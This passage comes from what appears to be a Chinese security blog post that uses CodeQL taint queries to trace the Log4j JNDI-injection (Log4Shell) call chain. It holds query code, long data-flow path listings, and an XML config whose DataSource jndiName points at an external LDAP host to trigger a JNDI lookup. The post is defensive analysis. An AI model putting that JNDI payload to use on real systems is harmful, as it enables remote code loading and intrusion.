Message 	AbstractLogger.java:2202:32</span><br><span class="line">10	message : Message 	AbstractLogger.java:2205:48</span><br><span class="line">11	message : Message 	AbstractLogger.java:2116:9</span><br><span class="line">12	message : Message 	AbstractLogger.java:2117:41</span><br><span class="line">...</span><br><span class="line">78	var : String 	Interpolator.java:230:92</span><br><span class="line">79	key : String 	JndiLookup.java:50:48</span><br><span class="line">80	key : String 	JndiLookup.java:54:49</span><br><span class="line">81	jndiName : String 	JndiLookup.java:70:36</span><br><span class="line">82	jndiName : String 	JndiLookup.java:74:16</span><br><span class="line">83	convertJndiName(...) : String 	JndiLookup.java:54:33</span><br><span class="line">84	jndiName : String 	JndiLookup.java:56:56</span><br><span class="line">85	name : String 	JndiManager.java:171:25</span><br><span class="line">86	name 	JndiManager.java:172:40</span><br></pre></td></tr></table></figure>

<p>​    但是在<code>AbstractLogger#tryLogMessage</code>中Codeql会直接分析到<code>AbstractLogger#log</code>而实际请求时会解析到<code>Logger#log</code>方法。这是因为<code>Logger</code>是<code>AbstractLogger</code>的子类并且也实现了log方法，而且我们实例化的也是Logger对象，所以这里会调用到<code>Logger#log</code>。</p>
<p><strong>实际请求</strong></p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211223174037146.png" alt="image-20211223174037146"></p>
<p><strong>CodeQL分析</strong></p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211223174111250.png" alt="image-20211223174111250"></p>
<p>​    再看看下面这条链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1	message : Message 	AbstractLogger.java:709:23</span><br><span class="line">2	message : Message 	AbstractLogger.java:710:47</span><br><span class="line">3	message : Message 	AbstractLogger.java:1833:89</span><br><span class="line">4	message : Message 	AbstractLogger.java:1836:51</span><br><span class="line">5	message : Message 	AbstractLogger.java:2139:94</span><br><span class="line">6	message : Message 	AbstractLogger.java:2142:59</span><br><span class="line">7	message : Message 	AbstractLogger.java:2155:43</span><br><span class="line">8	message : Message 	AbstractLogger.java:2159:67</span><br><span class="line">9	message : Message 	AbstractLogger.java:2202:32</span><br><span class="line">10	message : Message 	AbstractLogger.java:2205:48</span><br><span class="line">11	message : Message 	Logger.java:158:9</span><br><span class="line">12	message : Message 	Logger.java:162:17</span><br><span class="line">13	data : Message 	AwaitCompletionReliabilityStrategy.java:78:83</span><br><span class="line">14	data : Message 	AwaitCompletionReliabilityStrategy.java:82:67</span><br><span class="line">15	data : Message 	LoggerConfig.java:430:28</span><br><span class="line">16	data : Message 	LoggerConfig.java:454:17</span><br><span class="line">17	message : Message 	ReusableLogEventFactory.java:78:86</span><br><span class="line">18	message : Message 	ReusableLogEventFactory.java:100:27</span><br><span class="line">19	msg : Message 	MutableLogEvent.java:209:28</span><br><span class="line">20	(...)... : Message 	MutableLogEvent.java:211:46</span><br><span class="line">21	reusable : Message 	MutableLogEvent.java:212:13</span><br><span class="line">22	parameter this : Message 	ReusableObjectMessage.java:47:17</span><br><span class="line">23	obj : Object 	ReusableObjectMessage.java:48:44</span><br><span class="line">...</span><br><span class="line">88	convertJndiName(...) : String 	JndiLookup.java:54:33</span><br><span class="line">89	jndiName : String 	JndiLookup.java:56:56</span><br><span class="line">90	name : String 	JndiManager.java:171:25</span><br><span class="line">91	name 	JndiManager.java:172:40</span><br></pre></td></tr></table></figure>

<p>​    这条链在执行到<code>MutableLogEvent#setMessage</code>时和CodeQL的分析结果略有不同。</p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211224100438007.png" alt="image-20211224100438007"></p>
<p>​    在CodeQL中<code>resusable.formatTo</code>会调用到<code>ReusableObjectMessage</code>中。</p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211224100643070.png" alt="image-20211224100643070"></p>
<p>​    但是实际运行过程中由于MessgeFactorty创建Message对象时默认创建的是<code>ResableSimpleMessage</code>对象，所以会执行到<code>ResableSimpleMessage#formatTo</code>方法。</p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211224100922702.png" alt="image-20211224100922702"></p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211224101042005-16403118423501.png" alt="image-20211224101042005"></p>
<p>​    所以似乎目前使用使用CodeQL的规则是发现不了Log4jShell那个漏洞的，既然我们已经知道了这个漏洞的触发链，可以分析下CodeQL为什么没有分析出来。</p>
<p>​    通过之前对CodeQL检测出的调用链分析，CodeQL已经分析到了createEvent方法。</p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211224113857944.png" alt="image-20211224113857944"></p>
<p>​    查看createEvent方法的调用，在<code>Log4jShell</code>的触发链中实际上是在对返回LogEvent的处理过程中触发的，所以这里CodeQL可能没有将返回的LogEvent对象再当作污点进行分析，所以导致没有分析成功。</p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211224114008619.png" alt="image-20211224114008619"></p>
<p>​    我们可以创建一个<code>isAdditionalTaintStep</code>函数，将<code>ReusableLogEventFactory#createEvent</code>的第六个参数Message和<code>LoggerConfig#log</code>第一个参数<code>logEvent</code>连接起来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">override predicate <span class="title">isAdditionalTaintStep</span><span class="params">(DataFlow::Node fromNode, DataFlow::Node toNode)</span> </span>&#123;</span><br><span class="line">    exists(MethodAccess ma,MethodAccess ma2 |</span><br><span class="line">        ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;org.apache.logging.log4j.core.impl&quot;</span>, <span class="string">&quot;ReusableLogEventFactory&quot;</span>) </span><br><span class="line">        and ma.getMethod().hasName(<span class="string">&quot;createEvent&quot;</span>) and fromNode.asExpr()=ma.getArgument(<span class="number">5</span>) and ma2.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;org.apache.logging.log4j.core.config&quot;</span>, <span class="string">&quot;LoggerConfig&quot;</span>)  </span><br><span class="line">        and ma2.getMethod().hasName(<span class="string">&quot;log&quot;</span>) and ma2.getMethod().getNumberOfParameters() = <span class="number">2</span> and toNode.asExpr()=ma2.getArgument(<span class="number">0</span>)</span><br><span class="line">                )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​    最后我们就可以通过CodeQL分析到Log4j shell漏洞的调用链。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>	message : Message 	AbstractLogger.java:<span class="number">709</span>:<span class="number">23</span></span><br><span class="line"><span class="number">2</span>	message : Message 	AbstractLogger.java:<span class="number">710</span>:<span class="number">47</span></span><br><span class="line"><span class="number">3</span>	message : Message 	AbstractLogger.java:<span class="number">1833</span>:<span class="number">89</span></span><br><span class="line"><span class="number">4</span>	message : Message 	AbstractLogger.java:<span class="number">1836</span>:<span class="number">51</span></span><br><span class="line"><span class="number">5</span>	message : Message 	AbstractLogger.java:<span class="number">2139</span>:<span class="number">94</span></span><br><span class="line"><span class="number">6</span>	message : Message 	AbstractLogger.java:<span class="number">2142</span>:<span class="number">59</span></span><br><span class="line"><span class="number">7</span>	message : Message 	AbstractLogger.java:<span class="number">2155</span>:<span class="number">43</span></span><br><span class="line"><span class="number">8</span>	message : Message 	AbstractLogger.java:<span class="number">2159</span>:<span class="number">67</span></span><br><span class="line"><span class="number">9</span>	message : Message 	AbstractLogger.java:<span class="number">2202</span>:<span class="number">32</span></span><br><span class="line"><span class="number">10</span>	message : Message 	AbstractLogger.java:<span class="number">2205</span>:<span class="number">48</span></span><br><span class="line"><span class="number">11</span>	message : Message 	Logger.java:<span class="number">158</span>:<span class="number">9</span></span><br><span class="line"><span class="number">12</span>	message : Message 	Logger.java:<span class="number">162</span>:<span class="number">17</span></span><br><span class="line"><span class="number">13</span>	data : Message 	DefaultReliabilityStrategy.java:<span class="number">61</span>:<span class="number">83</span></span><br><span class="line"><span class="number">14</span>	data : Message 	DefaultReliabilityStrategy.java:<span class="number">63</span>:<span class="number">69</span></span><br><span class="line"><span class="number">15</span>	data : Message 	LoggerConfig.java:<span class="number">430</span>:<span class="number">28</span></span><br><span class="line"><span class="number">16</span>	data : Message 	LoggerConfig.java:<span class="number">454</span>:<span class="number">96</span></span><br><span class="line"><span class="number">17</span>	message : Message 	ReusableLogEventFactory.java:<span class="number">58</span>:<span class="number">47</span></span><br><span class="line"><span class="number">18</span>	message : Message 	ReusableLogEventFactory.java:<span class="number">60</span>:<span class="number">67</span></span><br><span class="line"><span class="number">19</span>	event : LogEvent 	LoggerConfig.java:<span class="number">469</span>:<span class="number">13</span></span><br><span class="line"><span class="number">20</span>	event : LogEvent 	LoggerConfig.java:<span class="number">479</span>:<span class="number">24</span></span><br><span class="line"><span class="number">21</span>	event : LogEvent 	LoggerConfig.java:<span class="number">481</span>:<span class="number">29</span></span><br><span class="line"><span class="number">22</span>	event : LogEvent 	LoggerConfig.java:<span class="number">495</span>:<span class="number">34</span></span><br><span class="line"><span class="number">23</span>	event : LogEvent 	LoggerConfig.java:<span class="number">498</span>:<span class="number">27</span></span><br><span class="line"><span class="number">24</span>	event : LogEvent 	LoggerConfig.java:<span class="number">536</span>:<span class="number">34</span></span><br><span class="line"><span class="number">25</span>	event : LogEvent 	LoggerConfig.java:<span class="number">540</span>:<span class="number">38</span></span><br><span class="line"><span class="number">26</span>	event : LogEvent 	AppenderControl.java:<span class="number">80</span>:<span class="number">30</span></span><br><span class="line"><span class="number">27</span>	event : LogEvent 	AppenderControl.java:<span class="number">84</span>:<span class="number">38</span></span><br><span class="line"><span class="number">28</span>	event : LogEvent 	AppenderControl.java:<span class="number">117</span>:<span class="number">47</span></span><br><span class="line"><span class="number">29</span>	event : LogEvent 	AppenderControl.java:<span class="number">120</span>:<span class="number">27</span></span><br><span class="line"><span class="number">30</span>	event : LogEvent 	AppenderControl.java:<span class="number">126</span>:<span class="number">32</span></span><br><span class="line"><span class="number">31</span>	event : LogEvent 	AppenderControl.java:<span class="number">129</span>:<span class="number">29</span></span><br><span class="line"><span class="number">32</span>	event : LogEvent 	AppenderControl.java:<span class="number">154</span>:<span class="number">34</span></span><br><span class="line"><span class="number">33</span>	event : LogEvent 	AppenderControl.java:<span class="number">156</span>:<span class="number">29</span></span><br><span class="line"><span class="number">34</span>	event : LogEvent 	AbstractDatabaseAppender.java:<span class="number">107</span>:<span class="number">30</span></span><br><span class="line"><span class="number">35</span>	event : LogEvent 	AbstractDatabaseAppender.java:<span class="number">110</span>:<span class="number">37</span></span><br><span class="line"><span class="number">36</span>	event : LogEvent 	AbstractDatabaseManager.java:<span class="number">260</span>:<span class="number">42</span></span><br><span class="line"><span class="number">37</span>	event : LogEvent 	AbstractDatabaseManager.java:<span class="number">262</span>:<span class="number">20</span></span><br><span class="line"><span class="number">38</span>	event : LogEvent 	AbstractDatabaseManager.java:<span class="number">122</span>:<span class="number">27</span></span><br><span class="line"><span class="number">39</span>	event : LogEvent 	AbstractDatabaseManager.java:<span class="number">123</span>:<span class="number">25</span></span><br><span class="line"><span class="number">40</span>	parameter <span class="keyword">this</span> : LogEvent 	Log4jLogEvent.java:<span class="number">530</span>:<span class="number">26</span></span><br><span class="line"><span class="number">41</span>	<span class="keyword">this</span> : LogEvent 	Log4jLogEvent.java:<span class="number">534</span>:<span class="number">16</span></span><br><span class="line"><span class="number">42</span>	toImmutable(...) : LogEvent 	AbstractDatabaseManager.java:<span class="number">123</span>:<span class="number">25</span></span><br><span class="line"><span class="number">43</span>	<span class="keyword">this</span>.buffer [post update] [&lt;element&gt;] : LogEvent 	AbstractDatabaseManager.java:<span class="number">123</span>:<span class="number">9</span></span><br><span class="line"><span class="number">44</span>	<span class="keyword">this</span> [post update] [buffer, &lt;element&gt;] : LogEvent 	AbstractDatabaseManager.java:<span class="number">123</span>:<span class="number">9</span></span><br><span class="line"><span class="number">45</span>	<span class="keyword">this</span> &lt;.method&gt; [post update] [buffer, &lt;element&gt;] : LogEvent 	AbstractDatabaseManager.java:<span class="number">262</span>:<span class="number">13</span></span><br><span class="line"><span class="number">46</span>	getManager(...) [post update] [buffer, &lt;element&gt;] : LogEvent 	AbstractDatabaseAppender.java:<span class="number">110</span>:<span class="number">13</span></span><br><span class="line"><span class="number">47</span>	<span class="keyword">this</span> [post update] [manager, buffer, &lt;element&gt;] : LogEvent 	AbstractDatabaseAppender.java:<span class="number">110</span>:<span class="number">13</span></span><br><span class="line"><span class="number">48</span>	appender [post update] [manager, buffer, &lt;element&gt;] : LogEvent 	AppenderControl.java:<span class="number">156</span>:<span class="number">13</span></span><br><span class="line"><span class="number">49</span>	<span class="keyword">this</span> &lt;.field&gt; [post update] [appender, manager, buffer, &lt;element&gt;] : LogEvent 	AppenderControl.java:<span class="number">156</span>:<span class="number">13</span></span><br><span class="line"><span class="number">50</span>	<span class="keyword">this</span> &lt;.method&gt; [post update] [appender, manager, buffer, &lt;element&gt;] : LogEvent 	AppenderControl.java:<span class="number">129</span>:<span class="number">13</span></span><br><span class="line"><span class="number">51</span>	<span class="keyword">this</span> &lt;.method&gt; [post update] [appender, manager, buffer, &lt;element&gt;] : LogEvent 	AppenderControl.java:<span class="number">120</span>:<span class="number">13</span></span><br><span class="line"><span class="number">52</span>	<span class="keyword">this</span> &lt;.method&gt; [post update] [appender, manager, buffer, &lt;element&gt;] : LogEvent 	AppenderControl.java:<span class="number">84</span>:<span class="number">9</span></span><br><span class="line"><span class="number">53</span>	event : LogEvent 	AppenderControl.java:<span class="number">80</span>:<span class="number">30</span></span><br><span class="line"><span class="number">54</span>	event : LogEvent 	AppenderControl.java:<span class="number">84</span>:<span class="number">38</span></span><br><span class="line"><span class="number">55</span>	event : LogEvent 	AppenderControl.java:<span class="number">117</span>:<span class="number">47</span></span><br><span class="line"><span class="number">56</span>	event : LogEvent 	AppenderControl.java:<span class="number">120</span>:<span class="number">27</span></span><br><span class="line"><span class="number">57</span>	event : LogEvent 	AppenderControl.java:<span class="number">126</span>:<span class="number">32</span></span><br><span class="line"><span class="number">58</span>	event : LogEvent 	AppenderControl.java:<span class="number">129</span>:<span class="number">29</span></span><br><span class="line"><span class="number">59</span>	event : LogEvent 	AppenderControl.java:<span class="number">154</span>:<span class="number">34</span></span><br><span class="line"><span class="number">60</span>	event : LogEvent 	AppenderControl.java:<span class="number">156</span>:<span class="number">29</span></span><br><span class="line"><span class="number">61</span>	event : LogEvent 	AbstractOutputStreamAppender.java:<span class="number">179</span>:<span class="number">24</span></span><br><span class="line"><span class="number">62</span>	event : LogEvent 	AbstractOutputStreamAppender.java:<span class="number">181</span>:<span class="number">23</span></span><br><span class="line"><span class="number">63</span>	event : LogEvent 	AbstractOutputStreamAppender.java:<span class="number">188</span>:<span class="number">28</span></span><br><span class="line"><span class="number">64</span>	event : LogEvent 	AbstractOutputStreamAppender.java:<span class="number">190</span>:<span class="number">31</span></span><br><span class="line"><span class="number">65</span>	event : LogEvent 	AbstractOutputStreamAppender.java:<span class="number">196</span>:<span class="number">38</span></span><br><span class="line"><span class="number">66</span>	event : LogEvent 	AbstractOutputStreamAppender.java:<span class="number">197</span>:<span class="number">28</span></span><br><span class="line"><span class="number">67</span>	event : LogEvent 	GelfLayout.java:<span class="number">433</span>:<span class="number">24</span></span><br><span class="line"><span class="number">68</span>	event : LogEvent 	GelfLayout.java:<span class="number">438</span>:<span class="number">43</span></span><br><span class="line"><span class="number">69</span>	event : LogEvent 	GelfLayout.java:<span class="number">471</span>:<span class="number">34</span></span><br><span class="line"><span class="number">70</span>	event : LogEvent 	GelfLayout.java:<span class="number">496</span>:<span class="number">46</span></span><br><span class="line"><span class="number">71</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">462</span>:<span class="number">27</span></span><br><span class="line"><span class="number">72</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">467</span>:<span class="number">25</span></span><br><span class="line"><span class="number">73</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">911</span>:<span class="number">34</span></span><br><span class="line"><span class="number">74</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">912</span>:<span class="number">27</span></span><br><span class="line"><span class="number">75</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">928</span>:<span class="number">28</span></span><br><span class="line"><span class="number">76</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">978</span>:<span class="number">44</span></span><br><span class="line"><span class="number">77</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">911</span>:<span class="number">34</span></span><br><span class="line"><span class="number">78</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">912</span>:<span class="number">27</span></span><br><span class="line"><span class="number">79</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">928</span>:<span class="number">28</span></span><br><span class="line"><span class="number">80</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">1033</span>:<span class="number">63</span></span><br><span class="line"><span class="number">81</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">1104</span>:<span class="number">38</span></span><br><span class="line"><span class="number">82</span>	event : LogEvent 	StrSubstitutor.java:<span class="number">1110</span>:<span class="number">32</span></span><br><span class="line"><span class="number">83</span>	event : LogEvent 	StructuredDataLookup.java:<span class="number">46</span>:<span class="number">26</span></span><br><span class="line"><span class="number">84</span>	event : LogEvent 	StructuredDataLookup.java:<span class="number">50</span>:<span class="number">67</span></span><br><span class="line"><span class="number">85</span>	parameter <span class="keyword">this</span> : LogEvent 	RingBufferLogEvent.java:<span class="number">206</span>:<span class="number">20</span></span><br><span class="line"><span class="number">86</span>	message : Message 	RingBufferLogEvent.java:<span class="number">210</span>:<span class="number">16</span></span><br><span class="line"><span class="number">87</span>	getMessage(...) : Message 	StructuredDataLookup.java:<span class="number">50</span>:<span class="number">67</span></span><br><span class="line"><span class="number">88</span>	(...)... : Message 	StructuredDataLookup.java:<span class="number">50</span>:<span class="number">43</span></span><br><span class="line"><span class="number">89</span>	msg : Message 	StructuredDataLookup.java:<span class="number">54</span>:<span class="number">20</span></span><br><span class="line"><span class="number">90</span>	parameter <span class="keyword">this</span> : Message 	StructuredDataMessage.java:<span class="number">239</span>:<span class="number">19</span></span><br><span class="line"><span class="number">91</span>	type : String 	StructuredDataMessage.java:<span class="number">240</span>:<span class="number">16</span></span><br><span class="line"><span class="number">92</span>	getType(...) : String 	StructuredDataLookup.java:<span class="number">54</span>:<span class="number">20</span></span><br><span class="line"><span class="number">93</span>	lookup(...) : String 	StrSubstitutor.java:<span class="number">1110</span>:<span class="number">16</span></span><br><span class="line"><span class="number">94</span>	resolveVariable(...) : String 	StrSubstitutor.java:<span class="number">1033</span>:<span class="number">47</span></span><br><span class="line"><span class="number">95</span>	varValue : String 	StrSubstitutor.java:<span class="number">1040</span>:<span class="number">63</span></span><br><span class="line"><span class="number">96</span>	buf [post update] : StringBuilder 	StrSubstitutor.java:<span class="number">1040</span>:<span class="number">33</span></span><br><span class="line"><span class="number">97</span>	buf [post update] : StringBuilder 	StrSubstitutor.java:<span class="number">912</span>:<span class="number">34</span></span><br><span class="line"><span class="number">98</span>	bufName [post update] : StringBuilder 	StrSubstitutor.java:<span class="number">978</span>:<span class="number">51</span></span><br><span class="line"><span class="number">99</span>	bufName : StringBuilder 	StrSubstitutor.java:<span class="number">979</span>:<span class="number">47</span></span><br><span class="line"><span class="number">100</span>	toString(...) : String 	StrSubstitutor.java:<span class="number">979</span>:<span class="number">47</span></span><br><span class="line"><span class="number">101</span>	varNameExpr : String 	StrSubstitutor.java:<span class="number">1010</span>:<span class="number">55</span></span><br><span class="line"><span class="number">102</span>	substring(...) : String 	StrSubstitutor.java:<span class="number">1010</span>:<span class="number">55</span></span><br><span class="line"><span class="number">103</span>	varName : String 	StrSubstitutor.java:<span class="number">1033</span>:<span class="number">70</span></span><br><span class="line"><span class="number">104</span>	variableName : String 	StrSubstitutor.java:<span class="number">1104</span>:<span class="number">60</span></span><br><span class="line"><span class="number">105</span>	variableName : String 	StrSubstitutor.java:<span class="number">1110</span>:<span class="number">39</span></span><br><span class="line"><span class="number">106</span>	key : String 	JndiLookup.java:<span class="number">50</span>:<span class="number">48</span></span><br><span class="line"><span class="number">107</span>	key : String 	JndiLookup.java:<span class="number">54</span>:<span class="number">49</span></span><br><span class="line"><span class="number">108</span>	jndiName : String 	JndiLookup.java:<span class="number">70</span>:<span class="number">36</span></span><br><span class="line"><span class="number">109</span>	... + ... : String 	JndiLookup.java:<span class="number">72</span>:<span class="number">20</span></span><br><span class="line"><span class="number">110</span>	convertJndiName(...) : String 	JndiLookup.java:<span class="number">54</span>:<span class="number">33</span></span><br><span class="line"><span class="number">111</span>	jndiName : String 	JndiLookup.java:<span class="number">56</span>:<span class="number">56</span></span><br><span class="line"><span class="number">112</span>	name : String 	JndiManager.java:<span class="number">171</span>:<span class="number">25</span></span><br><span class="line"><span class="number">113</span>	name 	JndiManager.java:<span class="number">172</span>:<span class="number">40</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞挖掘尝试"><a href="#漏洞挖掘尝试" class="headerlink" title="漏洞挖掘尝试"></a>漏洞挖掘尝试</h2><p>​    通过上面的分析可以看到，挖掘到所有的链最终的出发点都是JndiManager，这个点目前的触发已经在新版本中修复了，但是在<code>DataSourceConnectionSource#createConnectionSource</code>中也直接调用了lookup方法，我们能否通过某种方式触发呢？</p>
<p>​    通过注释可以看到DataSource是Core插件，因此可以在XML中配置调用。</p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211224170508608.png" alt="image-20211224170508608"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;ldap://9b89e78d.dns.1433.eu.org.&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">DataSource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;ERROR&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    配置后可以在插件加载的过程中触发漏洞，虽然这种方式也可以造成JNDI注入，但是需要在配置文件中修改参数才能触发，所以价值不大。</p>
<p><img src="/2021/12/22/%E5%88%A9%E7%94%A8CodeQL%E5%88%86%E6%9E%90Log4j%E6%BC%8F%E6%B4%9E/image-20211224170614375.png" alt="image-20211224170614375">    </p>
<p>​    最后给出整体的分析Log4j JNDI注入的CodeQL查询代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 